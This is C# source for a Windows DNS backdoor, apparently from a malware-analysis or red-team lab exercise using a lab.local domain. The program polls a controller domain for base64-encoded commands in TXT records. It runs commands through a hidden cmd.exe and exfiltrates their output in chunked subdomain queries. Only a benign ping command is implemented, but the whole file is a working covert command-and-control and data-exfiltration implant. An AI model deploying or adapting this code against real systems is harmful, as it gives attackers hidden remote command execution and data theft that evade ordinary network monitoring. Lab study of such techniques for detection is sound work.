using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace A06_6_DNS_Backdoor
{
    class Program
    {
        private static readonly string RootDomain = "cmd.lab.local";
        private static bool _isRunning = true;

        // Native Win32 DNS structures and Constants required for P/Invoke
        private const ushort DNS_TYPE_TEXT = 0x0010; // Explicitly target TXT records
        private const uint DNS_QUERY_STANDARD = 0x00000000;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_TXT_DATA
        {
            public uint dwStringCount;
            public IntPtr pStringArray; // Pointer to array of string pointers
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_RECORD
        {
            public IntPtr pNext;
            public string pName;
            public ushort wType;
            public ushort wDataLength;
            public uint flags;
            public uint dwTtl;
            public uint dwReserved;
            public DNS_TXT_DATA Data; // Simplified mapping targeting TXT data blocks
        }

        // Import DnsQuery_W natively from the Windows DNS Core Library
        [DllImport("dnsapi.dll", CharSet = CharSet.Unicode, EntryPoint = "DnsQuery_W")]
        private static extern int DnsQuery(
            string pszName,
            ushort wType,
            uint Options,
            IntPtr pExtra,
            out IntPtr ppQueryResultsSet,
            IntPtr pReserved
        );

        [DllImport("dnsapi.dll")]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);

        static void Main(string[] args)
        {
            while (_isRunning)
            {
                string queryTarget = $"agent77.{RootDomain}";
                string rawPayload = FetchNativeTxtRecord(queryTarget);

                if (!string.IsNullOrEmpty(rawPayload))
                {
                    // 1. Decode the raw Base64 payload text from INetSim into cleartext instructions
                    string commandLine = DecodeBase64(rawPayload).ToLower().Trim();

                    // 2. The Case Switch evaluation processing engine lives here:
                    switch (commandLine)
                    {
                        case "ping":
                            try
                            {
                                // 1. Locally execute a command and capture standard output
                                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                                proc.StartInfo.FileName = "cmd.exe";
                                proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2"; // Benign verification ping
                                proc.StartInfo.RedirectStandardOutput = true;
                                proc.StartInfo.UseShellExecute = false;
                                proc.StartInfo.CreateNoWindow = true;
                                proc.Start();

                                string output = proc.StandardOutput.ReadToEnd();
                                proc.WaitForExit();

                                // 2. Normalize and Base64 encode the output string
                                byte[] textBytes = Encoding.UTF8.GetBytes(output);
                                string base64Output = Convert.ToBase64String(textBytes);

                                // Remove padding characters '=' as they are illegal inside DNS subdomains
                                base64Output = base64Output.Replace("=", "");

                                // 3. Chunk and exfiltrate the string over DNS subdomains (Max 63 chars per label)
                                int chunkSize = 30;
                                for (int i = 0; i < base64Output.Length; i += chunkSize)
                                {
                                    string chunk = (i + chunkSize >= base64Output.Length)
                                        ? base64Output.Substring(i)
                                        : base64Output.Substring(i, chunkSize);

                                    string exfilDomain = $"data.{i / chunkSize}.{chunk}.{RootDomain}";

                                    // Send the exfiltration query natively (the answer doesn't matter, type 0x0001 is Type A)
                                    IntPtr pDummy = IntPtr.Zero;
                                    DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
                                    if (pDummy != IntPtr.Zero) DnsRecordListFree(pDummy, 0);

                                    Thread.Sleep(500); // 500ms delay between frames to prevent socket starvation
                                }
                            }
                            catch { }
                            break;

                        case "exit":
                            _isRunning = false;
                            break;

                        default:
                            // Unknown command string or plain fallback text handler
                            break;
                    }
                }

                Thread.Sleep(30000); // Poll every 30 seconds
            }
        }

        private static string FetchNativeTxtRecord(string domain)
        {
            IntPtr pResultList = IntPtr.Zero;

            // Invoke the native Windows DNS engine asking explicitly for TXT records
            int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);

            if (status == 0 && pResultList != IntPtr.Zero)
            {
                // Marshal the unmanaged pointer back into our structured C# representation
                DNS_RECORD record = (DNS_RECORD)Marshal.PtrToStructure(pResultList, typeof(DNS_RECORD));

                if (record.wType == DNS_TYPE_TEXT && record.Data.dwStringCount > 0)
                {
                    // Read the pointer to the actual text string array block
                    IntPtr pString = Marshal.ReadIntPtr(record.Data.pStringArray);
                    string txtResult = Marshal.PtrToStringUni(pString);

                    // Free the unmanaged memory allocations before returning
                    DnsRecordListFree(pResultList, 0);
                    return txtResult;
                }

                DnsRecordListFree(pResultList, 0);
            }
            return null;
        }

        // Helper function to decode incoming command payloads natively
        private static string DecodeBase64(string base64Data)
        {
            try
            {
                byte[] data = Convert.FromBase64String(base64Data);
                return Encoding.UTF8.GetString(data);
            }
            catch
            {
                return string.Empty; // Return blank if plaintext string hits it
            }
        }
    }
}